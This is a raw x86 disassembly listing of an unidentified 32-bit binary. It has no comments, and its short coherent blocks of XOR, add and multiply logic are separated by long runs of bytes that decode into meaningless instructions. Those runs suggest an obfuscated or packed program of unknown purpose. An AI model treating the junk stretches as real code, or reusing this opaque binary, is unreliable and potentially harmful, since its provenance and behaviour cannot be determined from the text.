  403a68:	call   DWORD PTR ds:0x4120c4
  403a6e:	mov    ebx,DWORD PTR ds:0x4337d7
  403a74:	dec    ebx
  403a75:	mov    DWORD PTR ds:0x4337d7,ebx
  403a7b:	jmp    0x403a4c
  403a80:	imul   edx,edi
  403a83:	mov    edi,DWORD PTR [ebp-0x8]
  403a86:	and    DWORD PTR ds:0x43381b,ebx
  403a8c:	mov    ebx,DWORD PTR [ebp-0x10]
  403a8f:	sub    ebx,edi
  403a91:	cmp    ebx,edx
  403a93:	ja     0x403aa5
  403a99:	mov    edx,DWORD PTR [ebp-0x4]
  403a9c:	xor    edx,eax
  403a9e:	add    edx,ecx
  403aa0:	jmp    0x40478a
  403aa5:	mov    edx,DWORD PTR [ebp-0x2c]
  403aa8:	mov    edi,DWORD PTR [ebp-0x4]
  403aab:	xor    edx,eax
  403aad:	xor    edi,eax
  403aaf:	add    edi,ecx
  403ab1:	add    edx,ecx
  403ab3:	imul   edx,edi
  403ab6:	mov    edi,DWORD PTR [ebp-0x8]
  403ab9:	jmp    0x403dbc
  403abe:	pop    ebp
  403abf:	cli    
  403ac0:	mov    bh,0xac
  403ac2:	jno    0x403a75
  403ac4:	gs dec ebx
  403ac6:	or     BYTE PTR [edi],dl
  403ac8:	scas   al,BYTE PTR es:[edi]
  403ac9:	loopne 0x403b0c
  403acb:	xchg   edx,eax
  403acc:	xchg   edx,eax
  403acd:	or     esp,DWORD PTR [eax]
  403acf:	adc    BYTE PTR [esi+0x7e],bh
  403ad2:	pop    eax
  403ad3:	jl     0x403b53
  403ad5:	jle    0x403aa6
  403ad7:	sbb    BYTE PTR [edi-0x5],bl
  403ada:	mov    edx,0x2e722bc5
  403adf:	(bad)  
  403ae0:	xlat   BYTE PTR ds:[ebx]
  403ae1:	nop
  403ae2:	int3   
  403ae3:	repnz mov dl,0x69
  403ae6:	pop    ebp
  403ae7:	call   0xc37a5c97
  403aec:	mov    ecx,0xec36c108
  403af1:	in     al,dx
  403af2:	push   ds
  403af3:	sub    cl,0x5e
  403af6:	int    0xba
  403af8:	push   ss
  403af9:	xchg   edi,eax
  403afa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403afb:	lods   al,BYTE PTR ds:[esi]
  403afc:	or     ecx,DWORD PTR [ecx+0x614053c5]
  403b02:	mov    ss,WORD PTR [ecx+edx*2]
  403b05:	in     al,0x91
  403b07:	sar    DWORD PTR gs:0x7763dd3b,0x89
  403b0f:	mov    dl,0xf8
  403b11:	ror    edx,cl
  403b13:	scas   eax,DWORD PTR es:[edi]
  403b14:	test   al,0xef
  403b16:	loopne 0x403b97
  403b18:	cmp    dh,al
  403b1a:	out    0xda,al
  403b1c:	ss aaa 
  403b1e:	outs   dx,BYTE PTR ds:[esi]
  403b1f:	xchg   edi,eax
  403b20:	push   ss
  403b21:	sub    dh,cl
  403b23:	jl     0x403b1d
  403b25:	fstp   TBYTE PTR [ebx+edx*4]
  403b28:	xor    ecx,esp
  403b2a:	fadd   DWORD PTR gs:[ebp-0x18]
  403b2e:	mov    dh,0xb
  403b30:	inc    ebx
  403b31:	out    0x6f,eax
  403b33:	pop    esp
  403b34:	out    0x10,al
  403b36:	adc    al,0xb1
  403b38:	pop    es
  403b39:	cmp    al,0x69
  403b3b:	mov    ah,0x1a
  403b3d:	repnz mov dh,0xbb
  403b40:	in     al,0x56
  403b42:	cli    
  403b43:	dec    edi
  403b44:	nop
  403b45:	inc    esp
  403b46:	jecxz  0x403ad8
  403b48:	cmp    dl,BYTE PTR [edx+edi*2+0x78]
  403b4c:	mov    ecx,0x5e99a840
  403b51:	mov    ebx,0xc14fa4ed
  403b56:	ret    
  403b57:	(bad)  
  403b5a:	cwde   
  403b5b:	out    0x2,eax
  403b5d:	mov    ecx,0x940a8750
  403b62:	out    0x46,al
  403b64:	xchg   ebx,eax
  403b65:	cs mov cl,0xe8
  403b68:	mul    DWORD PTR [edx]
  403b6a:	sti    
  403b6b:	fcom   DWORD PTR [esi]
  403b6d:	mov    edi,0xd179a079
  403b72:	das    
  403b73:	fimul  DWORD PTR [edi+0x35]
  403b76:	aas    
  403b77:	retf   0x625b
  403b7a:	dec    ebp
  403b7b:	(bad)  
  403b7c:	and    edi,DWORD PTR [ebx]
  403b7e:	push   ecx
  403b7f:	mov    ebp,0xf4c8fa4e
  403b84:	nop
  403b85:	sbb    edx,edx
  403b87:	mov    ah,0x8b
  403b89:	sbb    eax,0x1f7418d8
  403b8e:	inc    ebx
  403b8f:	test   esp,ebp
  403b91:	int    0x33
  403b93:	cld    
  403b94:	xchg   ebx,eax
  403b95:	sub    al,0x0
  403b97:	xchg   esp,eax
  403b98:	pop    ebp
  403b99:	dec    ebp
  403b9a:	shl    DWORD PTR [edi-0x61],cl
  403b9d:	rcr    DWORD PTR [eax],cl
  403b9f:	je     0x403c18
  403ba1:	lock fnstsw WORD PTR [bx+di]
  403ba5:	mov    cl,BYTE PTR [ecx+0x25]
  403ba8:	or     eax,0x72bb4d06
  403bad:	ds (bad) 
  403baf:	fnstsw WORD PTR [edx+0x26b6c6de]
  403bb5:	js     0x403b92
  403bb7:	xchg   ebp,eax
  403bb8:	sar    BYTE PTR [ecx+0x71],1
  403bbb:	(bad)  
  403bbc:	mov    esp,0xa08ec5f4
  403bc1:	fwait
  403bc2:	xchg   edi,eax
  403bc3:	adc    al,0xa3
  403bc5:	cmp    eax,0x339158d
  403bca:	sahf   
  403bcb:	shr    BYTE PTR [ebx-0x6e],0x8e
  403bcf:	pop    ebp
  403bd0:	push   es
  403bd1:	add    bl,bh
  403bd3:	and    eax,0x29e47b8f
  403bd8:	adc    eax,0x1ffe26b
  403bdd:	aaa    
  403bde:	jmp    0xaeb92bfc
  403be3:	repz jns 0x403c4b
  403be6:	scas   eax,DWORD PTR es:[edi]
  403be7:	stos   BYTE PTR es:[edi],al
  403be8:	out    dx,al
  403be9:	loop   0x403c26
  403beb:	dec    ecx
  403bec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bed:	dec    ecx
  403bee:	in     al,dx
  403bef:	pushf  
  403bf0:	clc    
  403bf1:	mov    cl,0x9
  403bf3:	rcl    BYTE PTR [ecx+0x630a8531],0x5e
  403bfa:	push   ebx
  403bfb:	std    
  403bfc:	iret   
  403bfd:	fst    st(1)
  403bff:	stos   BYTE PTR es:[edi],al
  403c00:	mov    eax,ds:0x97d7f0de
  403c05:	adc    al,0x52
  403c07:	jne    0x403c02
  403c09:	pop    edi
  403c0a:	fcmovnb st,st(7)
  403c0c:	fadd   st(6),st
  403c0e:	es ret 
  403c10:	mov    ds,ebp
  403c12:	shl    BYTE PTR [esi-0x589695c7],0x37
  403c19:	xchg   esi,eax
  403c1a:	jns    0x403c15
  403c1c:	adc    ah,BYTE PTR [esi-0x1b]
  403c1f:	adc    al,0xc
  403c21:	std    
  403c22:	lahf   
  403c23:	jle    0x403bb6
  403c25:	push   esi
  403c26:	mov    ecx,0x599cc328
  403c2b:	arpl   si,bp
  403c2d:	mov    cl,BYTE PTR [edx]
  403c2f:	cli    
  403c30:	sbb    eax,0x124e2500
  403c35:	fwait
  403c36:	leave  
  403c37:	inc    esp
  403c38:	xlat   BYTE PTR ds:[ebx]
  403c39:	push   ds
  403c3a:	lods   al,BYTE PTR ds:[esi]
  403c3b:	fwait
  403c3c:	lock xor ecx,edx
  403c3f:	or     eax,0x6783f360
  403c44:	(bad)  
  403c45:	jne    0x403c7b
  403c47:	xchg   ebp,eax
  403c48:	xchg   edx,eax
  403c49:	gs jmp 0x53bc:0xfb6a9813
  403c51:	push   es
  403c52:	or     ch,BYTE PTR [ebx+0x4a8128f0]
  403c58:	lock mov eax,0xe4ffade8
  403c5e:	shr    BYTE PTR [esi],cl
  403c60:	rcr    BYTE PTR [ecx-0x748bf84d],cl
  403c66:	sbb    al,0xc2
  403c68:	pop    ecx
  403c69:	xchg   ecx,eax
  403c6a:	sub    ebp,DWORD PTR [ebx-0x78]
  403c6d:	mov    ch,0x61
  403c6f:	push   ebp
  403c70:	cmp    esp,DWORD PTR [ebp-0x39f7bc8b]
  403c76:	and    eax,0xb278d16
  403c7b:	add    eax,0x35415dbd
  403c80:	adc    ebp,edx
  403c82:	inc    ebp
  403c83:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  403c85:	aas    
  403c86:	ss add eax,0x8e12aed0
  403c8c:	jl     0x403c2a
  403c8e:	jne    0x403c91
  403c90:	xchg   esi,eax
  403c91:	mov    ds:0xf4f9c686,eax
  403c96:	add    eax,0xda8347ae
  403c9b:	xchg   esi,eax
  403c9c:	mov    al,ds:0x877626f0
  403ca1:	gs das 
  403ca3:	cwde   
  403ca4:	out    dx,eax
  403ca5:	in     al,0x38
  403ca7:	pop    esp
  403ca8:	ja     0x403c8c
  403caa:	(bad)  
  403cab:	idiv   BYTE PTR [eax+0x163eb175]
  403cb1:	xor    ebp,esi
  403cb3:	and    edi,DWORD PTR [esi]
  403cb5:	sahf   
  403cb6:	jne    0x403c62
  403cb8:	sbb    DWORD PTR [eax],esi
  403cba:	ror    BYTE PTR [ecx],cl
  403cbc:	xchg   esp,eax
  403cbd:	or     dl,al
  403cbf:	cld    
  403cc0:	aas    
  403cc1:	icebp  
  403cc2:	ins    DWORD PTR es:[edi],dx
  403cc3:	dec    eax
  403cc4:	mov    al,0x6a
  403cc6:	(bad)  
  403cc8:	sbb    ch,dl
  403cca:	fimul  WORD PTR [eax+eiz*1+0x4160b9ab]
  403cd1:	push   es
  403cd2:	ins    BYTE PTR es:[edi],dx
  403cd3:	add    eax,0xd63d921f
  403cd8:	add    edi,DWORD PTR [esi]
  403cda:	loopne 0x403d1b
  403cdc:	pop    esi
  403cdd:	add    DWORD PTR [ecx+0x1e],eax
  403ce0:	adc    BYTE PTR ds:0xaa0fb8c9,dh
  403ce6:	rcr    BYTE PTR [eax-0x5a],cl
  403ce9:	popf   
  403cea:	ret    
  403ceb:	add    BYTE PTR gs:[ecx+0x3a981041],cl
  403cf2:	outs   dx,DWORD PTR ds:[esi]
  403cf3:	stc    
  403cf4:	pop    ebp
  403cf5:	jg     0x403cc3
  403cf7:	sbb    dl,0x4a
  403cfa:	add    BYTE PTR [edx],bh
  403cfc:	retf   0x8de6
  403cff:	add    dl,0xb4
  403d02:	jecxz  0x403cde
  403d04:	cmp    DWORD PTR [eax-0x24],ebx
  403d07:	arpl   bx,dx
  403d09:	icebp  
  403d0a:	test   dl,ch
  403d0c:	outs   dx,DWORD PTR ds:[esi]
  403d0d:	inc    esi
  403d0e:	xor    DWORD PTR [ebx],esi
  403d10:	jecxz  0x403d18
  403d12:	mov    ecx,0x229cb8be
  403d17:	mov    ds:0x4985f4dd,al
  403d1c:	inc    ebp
  403d1d:	xor    al,0x2b
  403d1f:	inc    eax
  403d20:	pushf  
  403d21:	ins    BYTE PTR es:[edi],dx
  403d22:	retf   
  403d23:	mov    eax,ds:0x9e670960
  403d28:	jmp    0x403d69
  403d2a:	xor    DWORD PTR [eax-0x73],esp
  403d2d:	outs   dx,DWORD PTR ds:[esi]
  403d2e:	outs   dx,BYTE PTR ds:[esi]
  403d2f:	push   ds
  403d30:	push   esi
  403d31:	cld    
  403d32:	arpl   WORD PTR [edi-0x77],ax
  403d35:	xor    eax,DWORD PTR [eax+0x1401bb5a]
  403d3b:	(bad)  
  403d3c:	retf   0x9ff3
  403d3f:	test   ah,0xe5
  403d42:	mov    eax,ds:0x2e73d7f5
  403d47:	cmp    ebp,DWORD PTR [edi-0x6f10f79a]
  403d4d:	pop    ebx
  403d4e:	xchg   edi,eax
  403d4f:	pop    edx
  403d50:	lods   eax,DWORD PTR ds:[esi]
  403d51:	cmp    ebp,eax
  403d53:	mov    ah,0x80
  403d55:	popf   
  403d56:	bound  ebp,QWORD PTR [ecx+0x65]
  403d59:	ret    0xeda8
  403d5c:	jge    0x403d32
  403d5e:	pushf  
  403d5f:	rcr    edi,1
  403d61:	hlt    
  403d62:	out    dx,al
  403d63:	jae    0x403d39
  403d65:	in     eax,0x88
  403d67:	ja     0x403d5a
  403d69:	push   ss
  403d6a:	cmc    
  403d6b:	imul   ebx,ebp,0xffffffd1
  403d6e:	enter  0xf9c8,0x22
  403d72:	lock call 0x79b38122
  403d78:	das    
  403d79:	stc    
  403d7a:	dec    edi
  403d7b:	(bad)  [ecx]
  403d7d:	adc    al,BYTE PTR [ecx+0x69532596]
  403d83:	nop
  403d84:	ret    0x5d64
  403d87:	push   es
  403d88:	xchg   ebx,eax
  403d89:	dec    al
  403d8b:	inc    edx
  403d8c:	and    al,0x93
  403d8e:	icebp  
  403d8f:	or     al,0x5
  403d91:	jp     0x403d36
  403d93:	jbe    0x403d83
  403d95:	test   DWORD PTR [eax-0x6c],esi
  403d98:	pop    esp
  403d99:	pop    ss
  403d9a:	lea    ebx,[ecx-0x41bf679]
  403da0:	jns    0x403dcf
  403da2:	dec    edx
  403da3:	retf   
  403da4:	jo     0x403e0c
  403da6:	(bad)  
  403da7:	dec    edi
  403da8:	retf   0x87cc
  403dab:	subps  xmm0,XMMWORD PTR [esp+eiz*4]
  403daf:	add    BYTE PTR [edx-0x215c3e8e],0xe9
  403db6:	pop    es
  403db7:	add    ah,al
  403db9:	xchg   edx,eax
  403dba:	push   0x1
  403dbc:	mov    ebx,DWORD PTR [ebp-0x10]
  403dbf:	sub    ebx,edi
  403dc1:	cmp    ebx,edx
  403dc3:	ja     0x403dd1
  403dc9:	mov    edx,DWORD PTR [ebp-0x28]
  403dcc:	jmp    0x404176
  403dd1:	mov    edx,DWORD PTR [ebp-0x30]
  403dd4:	mov    edi,DWORD PTR [ebp-0x4]
  403dd7:	xor    edx,eax
  403dd9:	xor    edi,eax
  403ddb:	add    edi,ecx
  403ddd:	add    edx,ecx
  403ddf:	imul   edx,edi
  403de2:	mov    edi,DWORD PTR [ebp-0x8]
  403de5:	mov    ebx,DWORD PTR [ebp-0x10]
  403de8:	sub    ebx,edi
  403dea:	cmp    ebx,edx
  403dec:	ja     0x403dfa
  403df2:	mov    edx,DWORD PTR [ebp-0x2c]
  403df5:	jmp    0x404176
  403dfa:	mov    edx,DWORD PTR [ebp-0x34]
  403dfd:	mov    edi,DWORD PTR [ebp-0x4]
  403e00:	xor    edx,eax
  403e02:	xor    edi,eax
  403e04:	add    edi,ecx
  403e06:	add    edx,ecx
  403e08:	imul   edx,edi
  403e0b:	mov    edi,DWORD PTR [ebp-0x8]
  403e0e:	mov    ebx,DWORD PTR [ebp-0x10]
  403e11:	sub    ebx,edi
  403e13:	cmp    ebx,edx
  403e15:	ja     0x403e23
  403e1b:	mov    edx,DWORD PTR [ebp-0x30]
  403e1e:	jmp    0x404176
  403e23:	mov    edx,DWORD PTR [ebp-0x38]
  403e26:	mov    edi,DWORD PTR [ebp-0x4]
  403e29:	xor    edx,eax
  403e2b:	xor    edi,eax
  403e2d:	add    edi,ecx
  403e2f:	add    edx,ecx
  403e31:	imul   edx,edi
  403e34:	mov    edi,DWORD PTR [ebp-0x8]
  403e37:	mov    ebx,DWORD PTR [ebp-0x10]
  403e3a:	sub    ebx,edi
  403e3c:	cmp    ebx,edx
  403e3e:	ja     0x403e4c
  403e44:	mov    edx,DWORD PTR [ebp-0x34]
  403e47:	jmp    0x404176
  403e4c:	mov    edx,DWORD PTR [ebp-0x3c]
  403e4f:	mov    edi,DWORD PTR [ebp-0x4]
  403e52:	xor    edx,eax
  403e54:	xor    edi,eax
  403e56:	add    edx,ecx
  403e58:	add    edi,ecx
  403e5a:	imul   edx,edi
  403e5d:	mov    edi,DWORD PTR [ebp-0x8]
  403e60:	mov    ebx,DWORD PTR [ebp-0x10]
  403e63:	jmp    0x404166
  403e68:	mov    dh,0x45
  403e6a:	xchg   edi,eax
  403e6b:	xor    BYTE PTR [ebp+0x50],0xb1
  403e6f:	jno    0x403e18
  403e71:	(bad)  
  403e72:	cs push 0xffffffd2
  403e75:	push   cs
  403e76:	push   ebx
  403e77:	(bad)  
  403e79:	pop    ds
  403e7a:	jle    0x403efa
  403e7c:	pop    eax
  403e7d:	jl     0x403efd
  403e7f:	jle    0x403ef6
  403e81:	add    edx,DWORD PTR [eax+0x16cc8ddb]
  403e87:	mov    ch,0x86
  403e89:	scas   eax,DWORD PTR es:[edi]
  403e8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e8b:	mov    bh,0x9b
  403e8d:	rcr    BYTE PTR gs:[esi],0x15
  403e91:	add    eax,edx
  403e93:	and    esi,0xffffff9f
  403e96:	test   ebp,ebp
  403e98:	stc    
  403e99:	loopne 0x403eb8
  403e9b:	inc    edx
  403e9c:	ins    DWORD PTR es:[edi],dx
  403e9d:	pop    ebx
  403e9e:	jmp    0xf2834508
  403ea3:	or     DWORD PTR [edi],edx
  403ea5:	loopne 0x403ec5
  403ea7:	pop    ecx
  403ea8:	call   0xbbcc:0x12f3d260
  403eaf:	pop    esp
  403eb0:	pushf  
  403eb1:	sbb    eax,0x43
  403eb4:	sahf   
  403eb5:	loop   0x403e4f
  403eb7:	popf   
  403eb8:	pop    ds
  403eb9:	mov    edi,0x54a43724
  403ebe:	je     0x403e82
  403ec0:	sbb    bh,BYTE PTR [eax*2+0x58e19bdb]
  403ec7:	push   edx
  403ec8:	clc    
  403ec9:	push   esp
  403eca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ecb:	inc    ebx
  403ecc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ecd:	sbb    DWORD PTR [ecx-0x3d],esi
  403ed0:	ins    DWORD PTR es:[edi],dx
  403ed1:	and    al,0xbf
  403ed3:	repz mov ds:0xcff4c5b2,al
  403ed9:	pop    edx
  403eda:	imul   ebx,eax,0x94ab704e
  403ee0:	out    0x99,al
  403ee2:	imul   eax,DWORD PTR [edx],0x75b84395
  403ee8:	sbb    DWORD PTR [ebp+ecx*8-0x22],esp
  403eec:	dec    ecx
  403eed:	aad    0x77
  403eef:	dec    ecx
  403ef0:	mov    al,0x6b
  403ef2:	jmp    0x6f48a32c
  403ef7:	lahf   
  403ef8:	inc    esp
  403ef9:	clc    
  403efa:	and    DWORD PTR [ebp+0x6768da81],ecx
  403f00:	dec    eax
  403f01:	aaa    
  403f02:	ins    DWORD PTR es:[edi],dx
  403f03:	pop    ss
  403f04:	enter  0xde33,0x11
  403f08:	dec    ebp
  403f09:	scas   al,BYTE PTR es:[edi]
  403f0a:	push   ds
  403f0b:	fiadd  WORD PTR [ebp+0x3f031516]
  403f11:	adc    edi,DWORD PTR [edi-0x5dcc191]
  403f17:	adc    ebp,DWORD PTR [ebp-0x40]
  403f1a:	mov    edi,0x416d940a
  403f1f:	stos   DWORD PTR es:[edi],eax
  403f20:	jl     0x403f1a
  403f22:	test   al,0x74
  403f24:	or     eax,0xda7ecd8a
  403f29:	les    ebp,FWORD PTR [ecx+0xc876e6d]
  403f2f:	inc    ebx
  403f30:	dec    edi
  403f31:	xchg   esp,eax
  403f32:	mov    cl,0x2
  403f34:	sbb    BYTE PTR [ebx],0x15
  403f37:	repz dec edi
  403f39:	repz scas eax,DWORD PTR es:[edi]
  403f3b:	addr16 adc eax,0x81b54dc8
  403f41:	mov    esp,0xa17bb84d
  403f46:	jmp    0x403eff
  403f48:	scas   al,BYTE PTR es:[edi]
  403f49:	repz sbb BYTE PTR [edx-0x1b],ah
  403f4d:	add    eax,0xf8a46f70
  403f52:	push   es
  403f53:	std    
  403f54:	mov    ecx,0xeafd3d95
  403f59:	jle    0x403f2b
  403f5b:	jl     0x403f39
  403f5d:	inc    edx
  403f5e:	popa   
  403f5f:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  403f61:	pusha  
  403f62:	(bad)  
  403f63:	adc    BYTE PTR [edx+0x6148cf72],cl
  403f69:	bound  edi,QWORD PTR [eax+0x37]
  403f6c:	adc    cl,ah
  403f6e:	pusha  
  403f6f:	or     BYTE PTR [edi-0x46],bl
  403f72:	inc    ecx
  403f73:	jnp    0x403fd1
  403f75:	fdiv   QWORD PTR [esi-0x6e]
  403f78:	ja     0x403f7b
  403f7a:	pop    ss
  403f7b:	inc    esp
  403f7c:	push   ss
  403f7d:	add    BYTE PTR [esi-0x67b1121],0x3c
  403f84:	(bad)  
  403f85:	push   eax
  403f86:	xchg   ebp,eax
  403f87:	pcmpeqd mm6,QWORD PTR [edx+0x5f]
  403f8b:	inc    ebp
  403f8c:	and    esi,DWORD PTR [eax]
  403f8e:	les    ecx,FWORD PTR [eax-0x42]
  403f91:	mov    edi,0xb5d12eb7
  403f96:	inc    edi
  403f97:	mov    DWORD PTR [ecx],eax
  403f99:	push   es
  403f9a:	sbb    BYTE PTR [eax],dh
  403f9c:	fst    DWORD PTR [edx+0x583f6f17]
  403fa2:	sbb    ch,al
  403fa4:	paddd  mm3,QWORD PTR [edx+0x5a]
  403fa8:	pop    ds
  403fa9:	imul   esi,DWORD PTR [edi-0x1f],0x32
  403fad:	inc    eax
  403fae:	sahf   
  403faf:	add    cl,BYTE PTR [ecx-0x3e11ff4]
  403fb5:	dec    ebp
  403fb6:	push   ebp
  403fb7:	push   edx
  403fb8:	hlt    
  403fb9:	ss jmp ecx
  403fbc:	jb     0x403fe5
  403fbe:	gs inc ebp
  403fc0:	daa    
  403fc1:	bound  ebx,QWORD PTR [edx+eiz*4+0x624f3f3f]
  403fc8:	pop    es
  403fc9:	cli    
  403fca:	jp     0x404021
  403fcc:	sar    ah,0xe5
  403fcf:	push   0x73
  403fd1:	pop    edi
  403fd2:	cmp    al,0xd1
  403fd4:	ret    0xe62c
  403fd7:	sub    ebp,DWORD PTR [edi]
  403fd9:	adc    ecx,DWORD PTR [esi+0x6c304efa]
  403fdf:	add    al,BYTE PTR [edi]
  403fe1:	pop    ds
  403fe2:	mov    BYTE PTR [ebx-0x64],dh
  403fe5:	test   BYTE PTR [ebx+0x79e3436f],0xdf
  403fec:	js     0x404007
  403fee:	sub    ecx,DWORD PTR [ebx-0x5a]
  403ff1:	xor    DWORD PTR [ebx+edx*2-0x32f1bd7b],ebx
  403ff8:	adc    al,0x3d
  403ffa:	pop    ds
  403ffb:	scas   eax,DWORD PTR es:[edi]
  403ffc:	bound  edx,QWORD PTR [esi-0x4d]
  403fff:	ins    DWORD PTR es:[edi],dx
  404000:	adc    al,0x9e
  404002:	sub    bh,al
  404004:	(bad)  
  404005:	lock mov ds:0x62486f77,eax
  40400b:	lea    ecx,[ebp-0x2a]
  40400e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40400f:	xchg   edx,eax
  404010:	cmp    edi,DWORD PTR [esi]
  404012:	ins    BYTE PTR es:[edi],dx
  404013:	repnz popa 
  404015:	mov    esi,0xe256d0ac
  40401a:	out    dx,eax
  40401b:	xlat   BYTE PTR ds:[ebx]
  40401c:	sbb    eax,0x148891b6
  404021:	enter  0x45af,0x6c
  404025:	jle    0x40400a
  404027:	rol    BYTE PTR [ebx+0x51],1
  40402a:	xchg   bh,ah
  40402c:	leave  
  40402d:	or     ebp,0xffffffa9
  404030:	add    edx,DWORD PTR [esi]
  404032:	out    dx,eax
  404033:	popa   
  404034:	sbb    DWORD PTR [edx+eiz*2+0x7d],0xffffffe6
  404039:	retf   
  40403a:	sbb    eax,DWORD PTR [edi]
  40403c:	imul   ebx,DWORD PTR [ebx+0x245e3c6d],0x40
  404043:	shl    esi,0xfe
  404046:	dec    edx
  404047:	mov    cl,0xff
  404049:	jmp    0xce73:0xd9b6ac94
  404050:	push   ss
  404051:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404052:	mov    bh,0x84
  404054:	jge    0x403ffa
  404056:	jne    0x4040c4
  404058:	mov    eax,esi
  40405a:	mov    ecx,0xdc906f4d
  40405f:	mov    esi,0x16b14377
  404064:	push   eax
  404065:	repz xchg esp,eax
  404067:	fwait
  404068:	jnp    0x404046
  40406a:	mov    dl,BYTE PTR [ebx]
  40406c:	(bad)  
  40406d:	out    0x96,eax
  40406f:	outs   dx,DWORD PTR ds:[esi]
  404070:	addr16 push ebx
  404072:	retf   
  404073:	aas    
  404074:	cmp    al,0xf4
  404076:	hlt    
  404077:	jo     0x40403f
  404079:	cmp    DWORD PTR [ebp-0x1b],ebp
  40407c:	repnz mov edx,eax
  40407f:	adc    edi,esi
  404081:	aam    0xc
  404083:	sub    al,BYTE PTR [eax]
  404085:	and    ecx,DWORD PTR [edx-0x78]
  404088:	out    dx,eax
  404089:	pop    ss
  40408a:	adc    eax,0xb5b80d36
  40408f:	bound  ebx,QWORD PTR [ecx+0x31]
  404092:	shl    BYTE PTR [edx],0x78
  404095:	scas   al,BYTE PTR es:[edi]
  404096:	push   esi
  404097:	jb     0x4040ef
  404099:	push   ebx
  40409a:	jne    0x4040d5
  40409c:	inc    eax
  40409d:	add    BYTE PTR [edx],cl
  40409f:	mov    al,0xa5
  4040a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040a2:	sbb    BYTE PTR [edi-0x3],dh
  4040a5:	adc    DWORD PTR [esi],ebx
  4040a7:	or     esi,DWORD PTR [edi]
  4040a9:	sbb    al,bh
  4040ab:	fadd   DWORD PTR [esi-0x37a0e82b]
  4040b1:	fwait
  4040b2:	adc    BYTE PTR [eax-0x6f],dh
  4040b5:	or     eax,esp
  4040b7:	add    eax,0x9ebaf357
  4040bc:	or     DWORD PTR [esi],edi
  4040be:	and    BYTE PTR [edi-0x27],cl
  4040c1:	jne    0x404091
  4040c3:	push   0xffffffb6
  4040c5:	and    edx,edi
  4040c7:	sub    edx,0xe62114c4
  4040cd:	pop    edx
  4040ce:	shr    DWORD PTR ds:0x4727857e,1
  4040d4:	mov    bh,bh
  4040d6:	xor    ch,BYTE PTR [ecx-0x3]
  4040d9:	pop    edi
  4040da:	loope  0x404099
  4040dc:	jbe    0x4040bf
  4040de:	shl    DWORD PTR [ebp-0x3e],0x9d
  4040e2:	xchg   esi,eax
  4040e3:	push   ss
  4040e4:	mov    BYTE PTR [ebx+0x4a0762f0],bl
  4040ea:	pop    edx
  4040eb:	jae    0x4040dc
  4040ed:	sub    DWORD PTR [eax+0x5abbd2c7],esp
  4040f3:	pop    edx
  4040f4:	xchg   ecx,eax
  4040f5:	retf   0x3bb4
  4040f8:	push   ss
  4040f9:	sbb    BYTE PTR [edx+0x5be84b88],ah
  4040ff:	jb     0x404179
  404101:	push   esi
  404102:	frstor [eax+eiz*1]
  404105:	jmp    0xd4fd:0x419c302c
  40410c:	sar    BYTE PTR [edx+0x39],0x3a
  404110:	popa   
  404111:	lods   eax,DWORD PTR ds:[esi]
  404112:	cdq    
  404113:	mov    eax,ds:0x7ce4b970
  404118:	retf   
  404119:	push   eax
  40411a:	inc    edx
  40411b:	sbb    BYTE PTR [edi-0x66],ch
  40411e:	test   eax,0x868a2731
  404123:	nop
  404124:	dec    esp
  404125:	sub    BYTE PTR [ecx-0x62],dl
  404128:	mov    eax,0xf27d84d6
  40412d:	inc    edx
  40412e:	xor    al,0xb6
  404130:	mov    esp,0x14e2a62b
  404135:	pusha  
  404136:	out    0x9,al
  404138:	sub    al,0x9d
  40413a:	and    esi,DWORD PTR [ebp+0x50ff43a5]
  404140:	aas    
  404141:	popf   
  404142:	add    BYTE PTR [edi],bh
  404144:	sub    esp,DWORD PTR [eax+eiz*4+0x7d7fe6c5]
  40414b:	fdivr  st(4),st
  40414d:	and    ah,0xf1
  404150:	daa    
  404151:	das    
  404152:	dec    edi
  404153:	scas   al,BYTE PTR es:[edi]
  404154:	enter  0x58eb,0x73
  404158:	add    BYTE PTR [ebx+ebx*2],cl
  40415b:	xlat   BYTE PTR ds:[ebx]
  40415c:	jbe    0x404144
  40415e:	outs   dx,DWORD PTR ds:[esi]
  40415f:	outs   dx,DWORD PTR ds:[esi]
  404160:	bound  esp,QWORD PTR [ecx-0x62]
  404163:	nop
  404164:	cwde   
  404165:	imul   BYTE PTR [ebx]
  404167:	fistp  QWORD PTR [ebx]
  404169:	fimul  DWORD PTR [ebx-0x79f037ab]
  40416f:	add    eax,DWORD PTR [eax]
  404171:	add    BYTE PTR [eax],al
  404173:	mov    edx,DWORD PTR [ebp-0x3c]
  404176:	mov    edi,DWORD PTR [ebp-0x4]
  404179:	jmp    0x40447c
  40417e:	mov    al,0x3b
  404180:	aaa    
  404181:	or     BYTE PTR [ebp-0x10],dh
  404184:	mov    cl,0x63
  404186:	sub    DWORD PTR [edi],0xffffffd4
  404189:	xor    BYTE PTR [ebp+edx*4-0x38],bl
  40418d:	and    esi,DWORD PTR [ebp+ebx*1+0x7e]
  404191:	jle    0x4041eb
  404193:	jl     0x404213
  404195:	jle    0x404153
  404197:	push   edx
  404198:	loopne 0x4041cb
  40419a:	hlt    
  40419b:	jmp    0xc6f5:0x687c3894
  4041a2:	dec    edx
  4041a3:	mov    eax,ds:0x452cec16
  4041a8:	jb     0x4041e8
  4041aa:	mov    DWORD PTR [edi],edi
  4041ac:	gs scas eax,DWORD PTR es:[edi]
  4041ae:	pusha  
  4041af:	cld    
  4041b0:	mov    ds:0x5228e493,eax
  4041b5:	dec    esp
  4041b6:	dec    eax
  4041b7:	sti    
  4041b8:	add    edx,DWORD PTR [ecx-0x107f7dba]
  4041be:	std    
  4041bf:	sbb    edx,esp
  4041c1:	add    al,0x16
  4041c3:	arpl   WORD PTR [edx-0x73a4f2e7],bp
  4041c9:	inc    eax
  4041ca:	int    0x42
  4041cc:	fs jb  0x40418e
  4041cf:	mov    ah,0xf7
  4041d1:	fist   DWORD PTR [ebx]
  4041d3:	sub    edi,DWORD PTR [eax+edx*4+0x15009d63]
  4041da:	fmul   DWORD PTR [ecx+eiz*2-0x3f4dacc3]
  4041e1:	xchg   ecx,eax
  4041e2:	dec    ebp
  4041e3:	mov    cl,0x9
